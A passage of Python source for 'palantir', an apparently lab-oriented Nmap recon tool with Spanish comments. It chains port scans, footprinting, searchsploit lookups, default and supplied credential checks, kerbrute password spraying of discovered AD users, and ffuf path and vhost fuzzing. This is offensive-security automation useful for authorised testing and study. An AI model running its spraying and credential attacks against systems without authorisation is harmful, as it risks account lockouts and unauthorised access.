                             "product": "", "version": "", "extrainfo": "", "tunnel": "",
                             "scripts": {}, "banner": ""} for n in ports], "host": {}}
    services, host = parsed["ports"], parsed["host"]
    for p in services:
        p["ip"] = ip

    # Fase 2 REEMPLAZA la lista de puertos de la Fase 1 (no la fusiona): si un puerto que
    # la Fase 1 confirmó open ya no sale "open" en el re-escaneo de la Fase 2 (visto en un
    # run real: 3389/tcp open en la Fase 1, "filtered" 27s después en la Fase 2 — dos
    # barridos de 65535 puertos seguidos contra el mismo host, probable rate-limit/flapping
    # del objetivo o de por medio), parse_nmap_xml() ya lo descarta por no estar "open" —
    # y antes esto pasaba en silencio: el puerto (y TODO lo que dependía de él: footprint,
    # credenciales, el propio informe) desaparecía del recon sin ningún aviso.
    missing = sorted(set(ports) - {p["port"] for p in services if p["proto"] == "tcp"})
    if missing:
        warn(f"La Fase 2 ya NO confirma como abiertos estos puertos que la Fase 1 SÍ encontró: "
             f"{', '.join(map(str, missing))} — no entran en el resto del recon (footprint/informe). "
             f"Probable rate-limit/flapping tras dos barridos completos seguidos, no necesariamente "
             f"que el puerto esté cerrado de verdad. Compruébalo a mano "
             f"(nmap -sV -p {','.join(map(str, missing))} {ip}) o repite el run — --resume NO sirve "
             f"aquí, reutilizaría este mismo resultado sin volver a preguntarle al objetivo.")

    want_udp = args.udp or (args.default_creds and is_root())   # creds necesita SNMP(161)/IPMI(623)
    if want_udp and is_root():
        for u in udp_scan(ip, nmapdir, stealth=args.stealth, source_port=args.source_port, tunnel=args.tunnel):
            u["ip"] = ip
            services.append(u)

    if not args.no_banner:
        grab_all_banners(services, source_port=args.source_port)

    render(ip, services, host)

    extra_dom = args.vhost or (name or None)

    # Informe HTML TEMPRANO: en cuanto el escaneo está listo (puertos + versiones + NSE +
    # banners, Fases 1-4) y ANTES del footprint/credenciales por protocolo (Fase 5, que
    # tarda — enum SMTP, creds por defecto, etc.). Así tienes algo que mirar de inmediato
    # mientras lo lento corre; se refresca luego con el footprint+creds y al final con el
    # definitivo. Barato (solo render), no re-escanea nada.
    #
    # OJO con --resume: write_reports() vuelca SIEMPRE a disco (findings.json incluido), no
    # solo a memoria — si aquí se le pasaran footprints=[]/phases_done=[] a secas (como antes),
    # este informe "de paso" PISARÍA el findings.json bueno de un run anterior con uno vacío
    # ANTES de que la Fase 5 real lo recalcule. Si el proceso se interrumpe o revienta en medio
    # de la Fase 5 (el único write_reports posterior que repoblaría footprints/phases_done ya no
    # llegaría a ejecutarse), ese findings.json queda vacío PARA SIEMPRE — justo el dato que
    # --resume existe para conservar. Por eso, mientras no se ha recalculado nada todavía, el
    # informe temprano reutiliza lo que YA hubiera en el `prev` cargado (si lo hay) en vez de
    # vaciarlo a ciegas; un `--resume` sin findings.json previo (prev=None) sigue empezando de [].
    if not args.no_html:
        _early_domains = discover_domains(services, host)
        if name and name not in _early_domains:
            _early_domains = sorted(set(_early_domains) | {name})
        _early_footprints = [_norm_fp(f) for f in prev.get("footprints", [])] if prev else []
        _early_phases_done = list(prev.get("phases_done", [])) if prev else []
        _early_vulns = (prev.get("vulns") or []) if prev else []
        write_reports(base, ip, services, host, _early_footprints, _early_vulns, _early_domains, {}, [],
                      extra_dom, preliminary=True, quiet=True, phases_done=_early_phases_done, name=name,
                      no_fuzz=args.no_fuzz)
        chown_results(base)
        good(f"Informe HTML preliminar (solo escaneo; footprint/credenciales en curso): {base / 'report.html'}")

    # Puertos web: separa primarios de ESPEJOS (80→443, 8080→8443… el mismo sitio en
    # varios puertos a la vez) UNA SOLA VEZ aquí arriba — antes cada fase (footprint,
    # fuzzing, vhost) repetía este chequeo por su cuenta, y footprint_services ni
    # siquiera lo hacía: footprinteaba (y, peor, le lanzaba nikto/nuclei/wpscan/katana
    # a) CADA puerto espejo por separado — el mismo sitio, hasta 2-4 veces.
    webs = [p for p in services if is_web(p)]
    webs_fp, web_mirrors = primary_web_ports(ip, webs) if webs else (webs, {})
    for _mp, _tgt in web_mirrors.items():
        info(f":{_mp} redirige a :{_tgt} (mismo sitio) → footprint/fuzzing/vhost solo en :{_tgt}, no lo duplico")
    webs_fuzz = webs_fp   # mismo conjunto deduplicado; el fuzzing de más abajo lo reutiliza tal cual

    # --resume de verdad (más allá de reutilizar los .xml de nmap, ver _nmap_run): si los
    # puertos/servicios detectados son EXACTAMENTE los del run anterior (mismo findings.json)
    # y ningún nmap tuvo que re-escanear de verdad, las fases ESTÁTICAS (footprint/
    # searchsploit/credenciales por defecto — dependen solo de 'services', que no cambió) van
    # a dar el MISMO resultado: repetirlas solo quema tiempo contra el objetivo y ensucia la
    # pantalla. Se reutilizan del findings.json anterior. Las credenciales APORTADAS (Fase 5d)
    # son la razón más habitual para relanzar con --resume (probar una cred nueva, p. ej.
    # tras un spray) y por eso NUNCA se saltan — son "lo nuevo" que sí hay que hacer y mostrar.
    resume_reuse_ok = _resume_reuse_ok(args.resume, prev, _TLS.nmap_fresh_scan, services)
    prev_phases = set(prev.get("phases_done", [])) if resume_reuse_ok else set()
    if resume_reuse_ok:
        info("[--resume] Mismos puertos/servicios que el run anterior: reutilizo footprint/searchsploit/"
             "credenciales por defecto de findings.json (no los repito) — solo relanzo lo nuevo "
             "(credenciales aportadas si las hay).")

    # Fase 5 — footprinting por protocolo (+ Fase 5b/5c/5d debajo)
    #
    # footprint_ok/searchsploit_ok/creds_default_ok: si la fase se REUTILIZA de un run anterior
    # (prev_phases) ya está "hecha" por definición; si se calcula de cero, solo cuenta como hecha
    # si el try no saltó por _phase_fail — antes phases_done (más abajo) se construía mirando
    # SOLO los flags de CLI (--no-footprint/--no-creds/...), así que una fase que PETABA y caía
    # en _phase_fail (con footprints vacíos/parciales) se guardaba igual como "footprint": hecho
    # en findings.json — un futuro --resume se la saltaría ENTERA dando por bueno ese resultado
    # vacío/parcial de un fallo transitorio, en vez de reintentarla.
    footprints, whatweb_cache = [], {}
    footprint_ok = searchsploit_ok = creds_default_ok = False
    will_need_fresh_whatweb = NIKTO or NUCLEI or CMS_SCAN or CRAWL   # necesitan el whatweb_cache recién hecho de footprint_services, no el de un run viejo
    if ("footprint" in prev_phases and not will_need_fresh_whatweb
            and not args.no_footprint and not args.default_creds):
        footprints = [_norm_fp(f) for f in prev.get("footprints", []) if f.get("_phase") == "footprint"]
        footprint_ok = True
    elif not args.no_footprint and not args.default_creds:
        try:
            footprints, whatweb_cache = footprint_services(ip, services, host, extra_dom, args.aggressive, webs_fp, base=base)
            for f in footprints:
                f["_phase"] = "footprint"
            footprint_ok = True
        except Exception as e:
            _phase_fail("footprinting", e, base)

    # Fase 5b — búsqueda de exploits conocidos (searchsploit, offline). No depende
    # del footprint/credenciales (solo lee 'services'), así que va aquí, justo tras
    # la Fase 5, para que el orden en pantalla coincida con el número (antes corría
    # al final, después de 5c/5d, aunque se llamaba "5b" — confuso de leer en vivo).
    vulns = None
    if "searchsploit" in prev_phases and not args.no_searchsploit:
        vulns = prev.get("vulns") or []
        render_vulns(vulns)
        searchsploit_ok = True
    elif not args.no_searchsploit:
        try:
            vulns = vuln_search(services)
            render_vulns(vulns)
            searchsploit_ok = True
        except Exception as e:
            _phase_fail("searchsploit", e, base)

    if "creds_default" in prev_phases and not args.no_creds:
        footprints += [_norm_fp(f) for f in prev.get("footprints", []) if f.get("_phase") == "creds_default"]
        creds_default_ok = True
    elif not args.no_creds:
        try:
            cc = creds_check(ip, services, host, args.aggressive)
            for f in cc:
                f["_phase"] = "creds_default"
            footprints += cc
            creds_default_ok = True
        except Exception as e:
            _phase_fail("credenciales por defecto", e, base)
    _win = _target_is_windows(services, host)   # Windows: usuarios case-insensitive → no dupliques Fiona/fiona
    pcreds = parse_provided_creds(args, windows=_win)
    if pcreds:
        bulk = None
        # Antes exigía --user-list/-U Y --pass-list/-P a la vez para pasar al camino en
        # bloque (bulk): con -U + una SOLA -p (o -u + -P), por grande que fuera la lista,
        # se quedaba en el bucle 1-a-1 de más abajo (1 proceso nxc por USUARIO, 40s de
        # timeout cada uno, sin --continue-on-success) — exactamente el caso real que lo
        # destapó (-U ad_users.txt -p Welcome1, 56 usuarios): tardaba tanto que un Ctrl-C
        # a mitad nunca llegaba a probar las últimas cuentas de la lista. _user_pass_combos
        # ya calcula bien los combos venga la lista de un lado, del otro o de los dos —
        # basta con mirar su tamaño, igual que ya hace confirm_creds_spray para el aviso.
        if args.user_list or args.pass_list:
            combos, bulk_users, bulk_passwords = _user_pass_combos(args, windows=_win)
            if len(combos) > _CREDS_SPRAY_WARN:
                bulk = (bulk_users, bulk_passwords, args.no_bruteforce)
                combo_set = set(combos)   # -U/-P ya va en bulk: quítalos de pcreds, no probarlos 2 veces
                pcreds = [c for c in pcreds if c not in combo_set]
        if pcreds or bulk:
            try:
                # Fase 5d necesita el dominio YA (para 'certipy find -u user@dominio', AD CS)
                # aunque el cálculo "oficial" de dominios (con crt.sh/--vhost-names) vaya más
                # abajo, después del footprint — discover_domains() es pura (solo relee
                # services/host, ya recogidos en Fases 1-4), así que adelantarla aquí no
                # tiene coste ni efecto secundario; el cálculo de más abajo (para "Dominios
                # detectados:" y el placeholder "DOMINIO" de Kerberos) sigue igual.
                _early_domains = discover_domains(services, host)
                if name and name not in _early_domains:
                    _early_domains = sorted(set(_early_domains) | {name})
                _early_ad_domain = next((d for d in _early_domains if base_domain(d) == d), None)
                newcreds = provided_creds_check(ip, services, pcreds, bulk=bulk, local_auth=args.local_auth,
                                                is_hash=bool(args.hash), base=base, domain=_early_ad_domain)
                for f in newcreds:
                    f["_phase"] = "creds_provided"
                footprints += newcreds
            except Exception as e:
                _phase_fail("credenciales aportadas", e, base)
    render_footprint(footprints)

    # Se guarda en findings.json (ver write_reports) para que un futuro --resume sepa qué
    # fases ya están hechas — "hecho" significa que el flag no las desactivó Y que de verdad
    # se completó (de cero o reutilizada de un run anterior), no que simplemente se intentó:
    # una fase que _phase_fail atrapó NO entra aquí, para que --resume la reintente.
    phases_done = []
    if footprint_ok:
        phases_done.append("footprint")
    if searchsploit_ok:
        phases_done.append("searchsploit")
    if creds_default_ok:
        phases_done.append("creds_default")

    hl = highlight(services, host)
    if hl:
        print(f"{C_BOLD}★ Hallazgos destacados (NSE):{C_RESET}")
        for label, line in hl:
            print(f"    {C_YELLOW}★{C_RESET} {label}: {C_GREY}{line}{C_RESET}")
        print()

    # Dominios autodescubiertos (+ el hostname del objetivo, si se dio por nombre,
    # + subdominios reales de crt.sh/DNS pasivo de la Fase 5 — ver fp_ctlogs/fp_subdomains,
    # + vhosts ya conocidos pasados a mano con --vhost-names)
    domains = discover_domains(services, host)
    if name and name not in domains:
        domains = sorted(set(domains) | {name})
    passive_subs = sorted({s for f in footprints for s in f.get("ctlog_subdomains", [])} |
                           {s for f in footprints for s in f.get("passive_subdomains", [])})
    if passive_subs:
        domains = sorted(set(domains) | set(passive_subs))
    vhost_names = _parse_hostnames(args.vhost_names) if args.vhost_names else []
    if vhost_names:
        domains = sorted(set(domains) | set(vhost_names))
    if domains:
        info("Dominios/hostnames detectados: " + ", ".join(domains))
        print(f"    {C_GREY}# /etc/hosts:{C_RESET}  {ip} {' '.join(domains)}")
        maybe_add_hosts(ip, domains, args)
        _make_hostname_symlinks(args.outdir, folder or ip, domains)
        # Algunos next-steps (Kerberos roasting…) se generan ANTES de conocer el dominio —
        # discover_domains() corre aquí, después del footprint — con un placeholder literal
        # "DOMINIO" a rellenar a mano. Ya que lo sabemos, se lo rellena al informe (no a la
        # salida en vivo de arriba, ya impresa) en vez de dejar el placeholder para siempre.
        ad_domain = next((d for d in domains if base_domain(d) == d), None)
        _fill_domain_placeholder(footprints, ad_domain)
    # Igual que el placeholder "DOMINIO" de arriba, pero para el next-step de Zerologon (ver
    # fp_smb): se genera con "NETBIOS-DEL-DC" porque en ese punto del run SIN credenciales no
    # está garantizado el nombre NetBIOS del DC — pero nbstat/rdp-ntlm-info/smb-os-discovery
    # (Fase 2, bastante antes) casi siempre YA lo capturaron. Fuera del "if domains:": no
    # depende de haber resuelto un dominio AD, solo del nombre NetBIOS del equipo.
    _fill_netbios_placeholder(footprints, netbios_computer_name(services, host))
    # Relay reflexivo: combina SMB signing no requerido + coacción NTLM (MSRPC) del MISMO host,
    # si ambos aparecen — ver _combine_relay_opportunity. Mismo sitio que los dos rellenos de
    # arriba (y por la misma razón: funciona igual en fresco que tras --resume).
    _combine_relay_opportunity(footprints, ip)

    # Fase 5f — password spraying AUTOMÁTICO (--spray): aquí, DESPUÉS del footprint (kerbrute
    # userenum) y de la enum SMB/LDAP, que ya poblaron <base>/ad_users.txt — rocía la contraseña
    # dada contra esos usuarios descubiertos en vivo, SIN que el operador tenga que dar -u. Paso
    # ACTIVO (puede bloquear cuentas) pero pedido explícitamente con --spray; kerbrute --safe lo
    # protege. Solo en un DC con dominio resuelto (ver _spray_phase).
    if SPRAY_PASSWORDS:
        try:
            ad_domain_for_spray = next((d for d in domains if base_domain(d) == d), None)
            spray_fp = _spray_phase(ip, ad_domain_for_spray, base, services)
            if spray_fp:
                spray_fp["_phase"] = "spray"
                footprints.append(spray_fp)
                render_footprint([spray_fp])
        except Exception as e:
            _phase_fail("password spraying", e, base)

    web_hits, vhosts = {}, []

    if vhost_names:
        phase(f"Fase 7 — vhosts dados a mano con --vhost-names ({len(vhost_names)}), sin fuzzing",
              "ya conoces los nombres (te los da el enunciado del lab) → te saltas el diccionario y vas derecho a confirmar/fingerprintear")
        by_base = {}
        for h in vhost_names:
            by_base.setdefault(base_domain(h), []).append({"host": h, "status": "-", "length": "-"})
        vhosts += list(by_base.items())

    # Informe en vivo: lee footprints/web_hits/vhosts EN EL MOMENTO de llamar (se van
    # rellenando durante el fuzzing). preliminary=True pinta banner + auto-refresh; quiet=True
    # evita inundar la pantalla con un 'good()' por fichero en cada refresco del fuzzing.
    def _write_report(preliminary, quiet=False):
        if not args.no_html:
            write_reports(base, ip, services, host, footprints, vulns, domains, web_hits, vhosts,
                          extra_dom, preliminary=preliminary, quiet=quiet, phases_done=phases_done,
                          name=name, no_fuzz=args.no_fuzz)

    # Primer informe HTML: en cuanto el footprint RÁPIDO (SMB/WinRM/RDP/NFS/DNS/SNMP/…
    # + fingerprint web básico) + exploits + credenciales están listos — y ANTES de
    # nikto/nuclei/cms-scan/crawl (--nikto/--nuclei/--cms-scan/--crawl, de lejos lo más
    # lento si están encendidos) y del fuzzing (Fase 6/7, la otra fase larga). Así
    # tienes algo que mirar ya mismo en vez de esperar a que todo eso termine; cada
    # hallazgo de ahí en adelante refresca la página, y al terminar se regenera el
    # informe DEFINITIVO (sin banner ni auto-refresh).
    will_slow_web = bool(webs_fp) and (NIKTO or NUCLEI or CMS_SCAN or CRAWL)
    will_fuzz = (not args.no_fuzz) and bool(webs) and bool(shutil.which("ffuf"))
    if (will_slow_web or will_fuzz) and not args.no_html:
        info("Footprint rápido + exploits + credenciales completos → informe HTML preliminar")
        _write_report(preliminary=True)
        chown_results(base)   # bajo sudo: que puedas abrir el HTML preliminar ya mismo

    # Fase 5e — escáneres web LENTOS y opt-in (nikto/nuclei/cms-scan/crawl): se lanzan
    # aparte y DESPUÉS del informe preliminar de arriba, justo para no bloquearlo con
    # algo que puede tardar varios minutos por puerto (nikto sobre todo). No hacen
    # nada si ninguno de los 4 flags está encendido (el caso normal).
    if will_slow_web:
        phase("Fase 5e — escáneres web opt-in (nikto/nuclei/cms-scan/crawl, pueden tardar varios minutos)")
        try:
            footprint_web_slow(ip, webs_fp, footprints, whatweb_cache, host, args.aggressive, hostname=extra_dom)
            render_footprint([f for f in footprints if f["proto"] == "web"])
        except Exception as e:
            _phase_fail("escáneres web (nikto/nuclei/cms/crawl)", e, base)
        if not args.no_html:
            _write_report(preliminary=True)   # 2º refresco: ya con nikto/nuclei/cms-scan/crawl
            chown_results(base)

    try:
        if not args.no_fuzz and webs and shutil.which("ffuf"):
            wls = pick_wordlists(args.wordlist, args.profile, add_always=not args.no_big_wordlist)
            if _target_is_windows(services, host):
                lc = _lowercase_wordlists(wls)
                if lc != wls:
                    info("Objetivo Windows (URLs case-insensitive) → wordlists -lowercase: misma cobertura, sin duplicados por mayúsculas y ~11% menos líneas")
                    wls = lc
            ext = norm_ext(args.ext) if args.ext else None
            if wls:
                phase(f"Fase 6 — fuzzing web ({len(wls)} lista/s): " +
                      ", ".join(Path(w).name for w in wls),
                      "prueba rutas/ficheros web de un diccionario para encontrar contenido no enlazado: paneles, backups, APIs, .git…")
                # Un puerto web = una tarea. El lock protege web_hits + el refresco del
                # informe en vivo cuando varios puertos se fuzzean a la vez (ver abajo).
                fuzz_lock = threading.Lock()

                def _fuzz_one_port(p):
                    e = ext if ext is not None else guess_extensions(p)
                    tag = f"{web_scheme(p)}://{ip}:{p['port']}"
                    hits = fuzz_dirs(ip, p, wls, e, webdir, stealth=args.stealth, proxy=args.proxy,
                                      hostname=extra_dom)
                    with fuzz_lock:                      # salida + web_hits + informe, atómico por puerto
                        web_hits[p["port"]] = hits
                        _write_report(preliminary=True, quiet=True)   # informe en vivo: crece con cada puerto
                        info(f"{tag} — {sanitize(version_str(p)) or p['name'] or '?'}  (-e {e})")
                        if hits:
                            good(f"{tag} — {len(hits)} rutas:")
                            for h in sorted(hits, key=lambda x: -(x["length"] or 0))[:40]:
                                print(f"    {C_GREEN}{h['status']}{C_RESET} /{h['path']}  ({h['length']} b)")
                        else:
                            info(f"{tag} — sin resultados.")

                # ffuf corre en modo silencioso (-s): fuzzear VARIOS puertos web del mismo
                # objetivo a la vez no ensucia la pantalla y ahorra tiempo. En --stealth NO
                # (su gracia es ir despacio y de uno en uno), y con 1 solo puerto tampoco.
                if args.stealth or len(webs_fuzz) <= 1:
                    for p in webs_fuzz:
                        _fuzz_one_port(p)
                else:
                    info(f"Fuzzeo {len(webs_fuzz)} puertos web en paralelo (--stealth los haría de uno en uno)")
                    with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(webs_fuzz), 4)) as _wex:
                        list(_wex.map(_fuzz_one_port, webs_fuzz))
            else:
                warn("No hay wordlist de directorios (instala seclists o pasa -w).")

            # Fase 7 — vhost: dominio de --vhost/hostname, o el base autodescubierto.
            # Si ya nos dieron --vhost-names, los vhosts ya están en `vhosts` (arriba) y
            # NO hace falta fuzzing de diccionario — nos lo saltamos entero.
            vhost_domains = [] if (vhost_names or args.no_vhost_fuzz) else (
                [args.vhost] if args.vhost else sorted({base_domain(d) for d in domains}))
            # Subdominios de crt.sh + DNS pasivo (Fase 5, fp_ctlogs/fp_subdomains) agrupados
            # por su dominio base: una wordlist minúscula de CONFIRMADOS (certificado real o
            # registro DNS visto), no adivinados — se prueban primero y son casi gratis (unos
            # pocos hosts) frente al barrido completo de abajo.
            ct_labels_by_base = {}
            for s in passive_subs:
                b = base_domain(s)
                if s != b:
                    ct_labels_by_base.setdefault(b, []).append(s[:-(len(b) + 1)])
            if vhost_domains:
                vwl = args.vhost_wordlist or DNS_WORDLIST
                if not Path(vwl).is_file():
                    warn("No hay wordlist de subdominios; me salto el vhost fuzzing.")
                else:
                    for dom in vhost_domains:
                        ct_labels = sorted(set(ct_labels_by_base.get(dom, [])))
                        if ct_labels:
                            ctwl = webdir / f"ctlog_vhost_{dom}.txt"
                            try:
                                ctwl.write_text("\n".join(ct_labels) + "\n")
                            except OSError as e:
                                warn(f"no pude escribir {ctwl}: {e} — salto el pre-chequeo de crt.sh para {dom} (sigue el resto de la Fase 7)")
                                ct_labels = []
                            if ct_labels:
                                phase(f"Fase 7 — vhost fuzzing (Host: FUZZ.{dom}) con subdominios de crt.sh ({len(ct_labels)}, confirmados por certificado)",
                                      "subdominios YA confirmados por una CA real (crt.sh) — se prueban primero, antes del diccionario genérico de abajo")
                            for p in webs_fuzz if ct_labels else []:
                                tag = f"{web_scheme(p)}://{ip}:{p['port']}"
                                vh = fuzz_vhost(ip, p, dom, str(ctwl), webdir, stealth=args.stealth, proxy=args.proxy)
                                if vh:
                                    vhosts.append((dom, vh))
                                    good(f"{tag} — {len(vh)} vhosts (crt.sh):")
                                    for h in vh:
                                        print(f"    {C_GREEN}{h['status']}{C_RESET} {h['host']}  ({h['length']} b)")
                                else:
                                    info(f"{tag} ({dom}) — ninguno de los subdominios de crt.sh respondió como vhost propio.")
                        phase(f"Fase 7 — vhost fuzzing (Host: FUZZ.{dom}) con {Path(vwl).name}",
                              "prueba subdominios en la cabecera Host: un mismo IP puede servir varios vhosts, algunos no publicados en DNS")
                        for p in webs_fuzz:
                            tag = f"{web_scheme(p)}://{ip}:{p['port']}"
                            vh = fuzz_vhost(ip, p, dom, vwl, webdir, stealth=args.stealth, proxy=args.proxy)
                            if vh:
                                vhosts.append((dom, vh))
                                good(f"{tag} — {len(vh)} vhosts:")
                                for h in vh:
                                    print(f"    {C_GREEN}{h['status']}{C_RESET} {h['host']}  ({h['length']} b)")
                            else:
                                info(f"{tag} ({dom}) — sin vhosts.")
                        _write_report(preliminary=True, quiet=True)   # informe en vivo: crece con cada dominio de vhost

            # Fase 7b — fuzzing de DIRECTORIOS por cada vhost concreto descubierto (no solo
            # el vhost por defecto que vio la Fase 6): en labs de Virtual Hosts cada FQDN
            # sirve un árbol distinto. Se conecta a la IP con Host: <vhost> (no depende de
            # DNS). Acotado a 6 vhosts para no disparar el tiempo.
            vh_fqdns = sorted({h["host"] for _, hits in vhosts for h in hits})
            if wls and vh_fqdns and len(vh_fqdns) <= 6:
                phase(f"Fase 7b — fuzzing de directorios por vhost ({len(vh_fqdns)} nombre/s, Host: por cabecera)",
                      "cada vhost puede servir un árbol de directorios distinto; la Fase 6 solo vio el vhost por defecto del servidor")
                for fqdn in vh_fqdns:
                    for p in webs_fuzz:
                        e = ext if ext is not None else guess_extensions(p)
                        tag = f"{web_scheme(p)}://{fqdn}:{p['port']} (Host:)"
                        hits = fuzz_dirs(ip, p, wls, e, webdir, stealth=args.stealth,
                                         proxy=args.proxy, host_header=fqdn)
                        if hits:
                            web_hits[f"{fqdn}:{p['port']}"] = hits
                            _write_report(preliminary=True, quiet=True)
                            good(f"{tag} — {len(hits)} rutas:")
                            for h in sorted(hits, key=lambda x: -(x["length"] or 0))[:40]:
                                print(f"    {C_GREEN}{h['status']}{C_RESET} /{h['path']}  ({h['length']} b)")
                        else:
                            info(f"{tag} — sin resultados.")
            elif wls and len(vh_fqdns) > 6:
                info(f"Fase 7b — {len(vh_fqdns)} vhosts (>6): me salto el fuzzing de directorios por vhost para no dispararme")
        elif not args.no_fuzz and webs and not shutil.which("ffuf"):
            warn("ffuf no está instalado: me salto el fuzzing web.")
        elif not args.no_fuzz and not webs:
            info("Sin servicios web: no se lanza ffuf.")

        # Los vhosts concretos (dev.x, app.x…) descubiertos en la Fase 7 NO estaban en
        # `domains` cuando se ofreció /etc/hosts más arriba (la Fase 7 corre después) —
        # segunda oferta, ya con los nombres reales que hacen falta para navegarlos.
        vhost_fqdns = sorted({h["host"] for _, hits in vhosts for h in hits})
        if vhost_fqdns:
            maybe_add_hosts(ip, vhost_fqdns, args)

        if vhosts and webs:
            info(f"Fingerprint por vhost ({len(set(h['host'] for _, hits in vhosts for h in hits))} nombre/s) — whatweb con el Host: correcto")
            why("cada vhost puede servir contenido DISTINTO (versión de Apache, CMS, SO) — el whatweb normal de la Fase 5 solo ve el vhost por defecto")
            vw = fp_vhost_web(ip, webs_fuzz, vhosts)
            render_footprint([vw])
            footprints.append(vw)

        render_quick_wins(quick_wins(footprints, vulns))   # lo más accionable, al final y bien visible
    finally:
        # Fase 8 — informe DEFINITIVO: se escribe SIEMPRE, aun si el fuzzing se
        # interrumpe (Ctrl-C) o un comando peta — nunca te quedas sin informe. La
        # excepción, si la hubo, se re-propaga sola a main() al salir del finally.
        _write_report(preliminary=False)
        chown_results(base)   # si se corrió con sudo, devuelve los ficheros al usuario real
        # Resumen final SIEMPRE (éxito, Ctrl-C o fallo): lo esencial de un vistazo y por dónde
        # seguir, sin tener que rebuscar hacia arriba tras un escaneo largo.
        try:
            print_run_summary(ip, name, base, services, host, footprints, vulns,
                              (datetime.now() - _t0).total_seconds())
        except Exception as _e:
            warn(f"no pude imprimir el resumen final: {_e}")


def _run_one_guarded(ip, name, args, folder=None):
    """run_one con captura de excepción: si un objetivo peta, NO tumba el resto — se avisa
    y se vuelca el traceback completo a <outdir>/<folder>/error.log (antes solo salía el
    mensaje corto, imposible de depurar). KeyboardInterrupt sí se re-propaga (aborta todo).
    Devuelve True si fue bien, False si falló."""
    try:
        run_one(ip, name, args, folder=folder)
        return True
    except KeyboardInterrupt:
        raise
    except Exception as e:
        err(f"objetivo {ip} falló: {e}")
        try:
            elog = Path(args.outdir) / (folder or ip) / "error.log"
            elog.parent.mkdir(parents=True, exist_ok=True)
            elog.write_text(f"{datetime.now():%Y-%m-%d %H:%M:%S}\n{traceback.format_exc()}",
                            encoding="utf-8")
            err(f"traceback completo en {elog}")
        except OSError:
            pass
        return False


# ───────────────────────── main ─────────────────────────
def _load_rc_args(path=None):
    """Lee ~/.palantirrc (flags por defecto; varios por línea, '#' comenta) y los
    devuelve como lista para anteponerlos a los de la CLI — así la línea de comandos
    SIEMPRE gana. Bajo sudo lee el del usuario real (mismo home que los resultados)."""
    rc = Path(path) if path else default_outdir_home() / ".palantirrc"
    if not rc.is_file():
        return []
    out = []
    try:
        for line in rc.read_text(encoding="utf-8").splitlines():
            line = line.split("#", 1)[0].strip()
            if line:
                out += shlex.split(line)
    except (OSError, ValueError):
        pass
    return out


def main():
    ap = argparse.ArgumentParser(description="palantir — recon guiado por Nmap (Kali).")
    ap.add_argument("target", nargs="?",
                    help="Objetivo(s): IP, CIDR (10.10.10.0/24), rango (10.10.10.1-20), "
                         "hostname, o varios separados por coma/espacio.")
    ap.add_argument("--targets", metavar="FICHERO",
                    help="Fichero con objetivos (uno por línea; admite IP/CIDR/rango/hostname, '#' comenta).")
    ap.add_argument("-o", "--outdir", default=str(default_outdir_home() / "htb"),
                    help="Carpeta base de resultados (def. ~/htb del usuario real, no /root bajo sudo).")
    ap.add_argument("-w", "--wordlist", nargs="+", metavar="WL",
                    help="Una o varias wordlists para ffuf (gana al --profile).")
    ap.add_argument("--profile", choices=WORDLIST_PROFILES, default="medium",
                    help="Tamaño de la wordlist de fuzzing web: quick (rápida), medium (equilibrada, def.), "
                         "big (exhaustiva). La gana -w/--wordlist si la pasas.")
    ap.add_argument("--no-big-wordlist", action="store_true",
                    help="No añadas dirb/big.txt (~20k líneas) a la(s) wordlist(s) elegida(s) — por defecto "
                         "se suma siempre sea cual sea --profile/-w. Para objetivos reales (no labs) donde "
                         "cada puerto extra multiplica el tiempo y la wordlist pequeña ya basta de primeras.")
    ap.add_argument("--ext", help="Fuerza extensiones; si no, se deducen del servicio.")
    ap.add_argument("--vhost", metavar="DOMINIO",
                    help="Fuerza vhost fuzzing + AXFR DNS (si no, se autodescubre el dominio). "
                         "Alias: -D/--domain (mismo campo).")
    ap.add_argument("-D", "--domain", metavar="DOMINIO", dest="domain", default=None,
                    help="Alias de --vhost pensado para boxes de solo-DNS/AD: fija el dominio para el "
                         "AXFR del apex + brute de subzonas, WHOIS y crt.sh (y el vhost fuzzing si hay web). "
                         "Úsalo cuando el enunciado te da el dominio (p. ej. inlanefreight.htb) y no hay "
                         "web/cert que lo filtre. Si pones --vhost y -D/--domain a la vez, deben coincidir "
                         "(si no, error: son el mismo campo).")
    ap.add_argument("--vhost-wordlist", metavar="FICHERO",
                    help="Wordlist de subdominios para el vhost fuzzing (def.: la de subdominios de seclists).")
    ap.add_argument("--vhost-names", metavar="LISTA",
                    help="Nombres de vhost YA CONOCIDOS, separados por coma (p. ej. "
                         "'app.inlanefreight.local,dev.inlanefreight.local' — el enunciado del lab te los da). "
                         "Se saltan el fuzzing por diccionario de la Fase 7 (también el de --vhost, si lo pasas "
                         "a la vez — --vhost solo queda para el AXFR/WHOIS) y van derechos a confirmarse/"
                         "fingerprintearse (whatweb con el Host: correcto, cada vhost puede servir contenido "
                         "distinto — versión de Apache, CMS, SO).")
    ap.add_argument("--snmp-wordlist", metavar="FICHERO",
                    help="Wordlist de community strings para el brute SNMP con onesixtyone (def.: la de "
                         "seclists). Si 'public' no responde, palantir prueba esta lista y, con la community "
                         "que encuentre, hace el walk a los OIDs jugosos automáticamente.")
    ap.add_argument("--userenum-wordlist", metavar="FICHERO",
                    help="Wordlist de usuarios para el kerbrute userenum de la Fase 5 (enum de usuarios AD "
                         "por Kerberos pre-auth; NO bloquea cuentas). Sin esto, en un DC con dominio conocido "
                         "palantir usa una lista PEQUEÑA de seclists automáticamente (segundos); pásale una "
                         "grande (p. ej. xato-10M) si quieres barrer a fondo (tardará).")
    ap.add_argument("--no-userenum", action="store_true",
                    help="No ejecutar el kerbrute userenum automático de la Fase 5 (solo lo deja como sugerencia).")
    ap.add_argument("--spray", metavar="PASS",
                    help="Password spraying AUTOMÁTICO contra los usuarios AD que palantir descubra EN VIVO "
                         "(kerbrute userenum + enum SMB/LDAP → ad_users.txt): rocía ESTA contraseña contra "
                         "todos ellos con 'kerbrute passwordspray --safe'. NO hace falta -u: los usuarios los "
                         "saca palantir solo. Para varias contraseñas, sepáralas por coma (--spray 'Welcome1,"
                         "Primavera2025'). OJO: una pre-auth fallida SÍ cuenta como login fallido y PUEDE "
                         "bloquear cuentas — --safe aborta en cuanto detecta un bloqueo, y palantir avisa antes; "
                         "aun así es un paso ACTIVO (solo contra un DC con dominio resuelto).")
    ap.add_argument("--top", action="store_true", help="Solo top-1000 puertos (más rápido).")
    ap.add_argument("--port", metavar="PUERTOS",
                    help="Restringe TODO el escaneo a estos puertos (coma: 80,443,38490) en vez de "
                         "barrer -p-/--top-ports — útil cuando ya sabes el puerto (p. ej. labs de HTB "
                         "Academy con un puerto aleatorio dado para Virtual Hosts). Ignora --top. "
